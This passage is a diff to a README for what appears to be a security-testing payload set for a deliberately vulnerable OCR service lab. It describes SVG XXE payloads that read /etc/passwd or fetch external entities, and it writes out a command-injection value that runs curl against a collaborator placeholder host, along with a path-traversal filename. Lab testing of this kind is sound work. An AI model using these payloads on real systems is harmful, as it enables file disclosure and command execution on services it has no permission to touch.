@@ -24,3 +24,31 @@ Naming is free-form; the table shows `file:<filename>` as the payload name.
 - `tiff_remote.tiff`, `jp2_*`, etc. — format-specific parser probes.
 
 Two text examples are included below to show the template shape.
+
+## XXE / parser payloads (added for the vuln-ocr-service lab)
+
+These target a server-side **XML/SVG parser** (e.g. lxml/libxml2) that resolves
+external entities — a different sink from the rasterizer-href SSRF in
+`tiff_svg_hybrid_ssrf.svg`.
+
+- `svg_xxe_file_read.svg` — in-band XXE. Reads `file:///etc/passwd` and places
+  it in `<text>`, so a pipeline that returns/flattens SVG text reflects the
+  file. Correlate by `root:` in the response, not by an OOB hit.
+- `svg_xxe_oob.svg` — OOB XXE via a general external entity over HTTP.
+- `svg_xxe_oob_paramentity.svg` — OOB XXE via a parameter entity pulling an
+  external DTD (fires in the DTD phase).
+
+**Host caveat observed in the lab:** libxml2 ≥ 2.13 dropped the built-in HTTP
+entity loader, so on such hosts the two OOB SVGs read `file://` fine but their
+HTTP fetch silently returns empty (no catcher hit). XXE there means local file
+read / `file://` SSRF, not HTTP OOB. Report that honestly.
+
+## Field-level mutations (not files)
+
+Two sinks live in request fields, not the document body, so the headless
+harness (`tools/local_replay.py`) injects them directly rather than as files:
+
+- `lang` → command injection: `"eng; curl http://{{COLLAB}}/ #"`.
+- `filename` → command injection and path traversal
+  (`"../../TRAVERSAL_PROOF.txt"`). In Burp, set these on the request before
+  sending it to the extension.
